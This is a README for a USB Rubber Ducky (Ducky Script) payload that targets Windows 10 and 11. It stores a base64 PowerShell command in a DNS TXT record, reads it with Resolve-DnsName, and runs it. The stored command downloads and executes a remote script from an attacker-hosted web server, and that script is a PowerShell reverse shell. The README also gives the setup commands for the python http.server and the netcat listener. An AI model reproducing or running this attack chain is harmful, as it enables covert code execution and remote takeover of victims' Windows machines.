# DNS-TXT-CommandInjection
Ducky Script uses Resolve-DnsName to perform a DNS name query resolution for a domain hosting a malicious TXT record. The payload leverages DNS TXT records to perform command injection. Windows Powershell is the CLI used by the payload. Replace the DNS TXT record for your domain with the base64 encoded payload you have. 
## Description
Author: Nate\
Target: Windows 10, 11\
Props: Hak5, Darren Kitchen, Korben\
Version: 1.0\
Category: Execution
## Configuration
1. A domain with the ability to manipulate the DNS TXT records.
2. Add command to DNS TXT records. See Links for an example of creating your DNS TXT record in AWS Route53 service.
3. Web Server hosting a file. In this example, python3 http.server was used to host a reverseshell.
4. Update powershellReverseShellOne-liner.ps1.
5. Set up istener on the attacker machine to reflect what is in powershellReverseShellOne-liner.ps1. Netcat was used in this example.
6. Provide URL used for Example #MY_TARGET_URL in DNS-TXT-CommandInjection.txt
## Notes
Other commands can be added to DNS TXT record rather than the example below.
No base64 can be used as an option by replacing "$a=",";powershell -e $a" with just "|iex" for the STRINGLN payload. Examples of the decoded command and encoded command are shown below to put into the DNS TXT record.

Decoded: "irm http://MY_TARGET_URL/T1.txt | iex"\
Encoded: "aQByAG0AIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAFQAMQAuAHQAeAB0ACAAfAAgAGkAZQB4AA=="

powershellReverseShellOne-liner.ps1 is identical to T1.txt. (shortened due to character limitations)\
ShoutOut: powershell reverse shell one-liner by Nikhil SamratAshok Mittal @samratashok. See link below.
## Windows Commands (used in payload)
### Execute DNS TXT Payload
```Powershell
powershell /w 1 $a=(resolve-dnsname #MY_TARGET_URL TXT).strings;powershell -e $a
```
### Execute web hosted Powershell Reverseshell
```Powershell
irm http://MY_TARGET_URL/T1.txt | iex
```
## Linux Commands
### Web Server to host a file
```Bash
python3 -m http.server 80
```
### Netcat listener
```Bash
nc -lvnp 1337
```
### Links

[Powershell Reverseshell One-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

[Create TXT record in AWS Route53](https://www.entrust.com/knowledgebase/ssl/how-to-create-a-txt-record-on-amazon-aws-route-53-for-entrust-email-validation-method)
